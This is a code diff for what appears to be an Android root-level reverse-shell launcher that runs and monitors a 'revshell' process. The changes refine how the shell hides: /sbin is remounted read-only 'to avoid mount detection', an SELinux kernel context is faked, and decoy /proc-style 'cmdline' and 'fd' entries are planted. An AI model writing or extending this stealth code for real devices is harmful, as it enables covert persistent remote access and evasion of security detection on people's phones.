@@ -105,7 +105,7 @@ int monitor_proc(pid_t ppid) {
 
         snprintf(statFilePath, 31, "/proc/%d/stat", ppid);
 
-        statFile = fopen(statFilePath, "r");
+        statFile = fopen(statFilePath, "re");
         if (statFile == NULL) {
             ALOGD("Revshell died! (no stat)");
             break;
@@ -139,7 +139,7 @@ int monitor_proc(pid_t ppid) {
             if (entry->d_type == DT_DIR && std::all_of(entry_name.begin(), entry_name.end(), ::isdigit)) {
                 snprintf(statFilePath, 31, "/proc/%s/stat", entry_name.c_str());
 
-                statFile = fopen(statFilePath, "r");
+                statFile = fopen(statFilePath, "re");
                 if (statFile == NULL)
                     continue;
 
@@ -184,7 +184,7 @@ int main(int argc, char** argv, char** envp) {
 
     // Remount read-only /sbin on system-as-root
     // (may fail on rootfs, no problem there)
-    if (access("/sbin", F_OK) == 0) {
+    if (access(SBIN_REVSHELL, F_OK) == 0) {
         ALOGD("Remounting /sbin to avoid mount detection ...");
         mount(nullptr, "/sbin", nullptr, MS_REMOUNT | MS_RDONLY, nullptr);
         revshell_path = SBIN_REVSHELL;
@@ -204,6 +204,9 @@ int main(int argc, char** argv, char** envp) {
     // fake selinux context and permissions
     system("chmod 555 " TEMP_MNT_POINT TEMP_DIR EMPTY_DIR);
     system("chcon u:r:kernel:s0 " TEMP_MNT_POINT TEMP_DIR EMPTY_DIR);
+    int fd = open(TEMP_MNT_POINT TEMP_DIR EMPTY_DIR "/cmdline", O_WRONLY | O_CREAT, 0555);
+    close(fd);
+    mkdir(TEMP_MNT_POINT TEMP_DIR EMPTY_DIR "/fd", 0555);
 #endif
 
     // await decryption by user
@@ -252,6 +255,7 @@ int main(int argc, char** argv, char** envp) {
             execve(revshell_path.c_str(), rs_argv, envp);
         } else {
             // Parent (executor)
+            sleep(1);
             monitor_proc(revshell);
             waitpid(revshell, &status, 0);
             sleep(5);
